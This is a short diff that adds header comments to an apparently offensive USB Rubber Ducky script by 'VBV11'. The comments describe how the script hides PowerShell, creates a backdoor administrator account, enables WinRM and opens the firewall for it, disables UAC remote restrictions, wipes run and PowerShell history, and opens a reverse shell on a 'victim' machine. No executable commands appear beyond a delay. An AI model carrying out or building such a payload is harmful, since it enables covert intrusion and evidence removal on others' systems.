@@ -1,3 +1,14 @@
+REM Dependencies:
+REM - Both attacker and victim must be on the same network for the connection to be established successfully.
+REM - Ensure you have administrative access to the target machine.
+
+REM About:
+REM This script automates the setup of a Windows system for remote administration and privilege escalation.
+REM It hides the PowerShell window, creates a new local user account with administrative privileges,
+REM enables Windows Remote Management (WinRM), adds a firewall rule to allow WinRM traffic,
+REM disables User Account Control (UAC) remote restrictions, deletes the run box history,
+REM clears PowerShell history, and executes a Rubber Ducky payload to establish a reverse shell using WinRM.
+
 REM Author: VBV11
 
 DELAY 1000
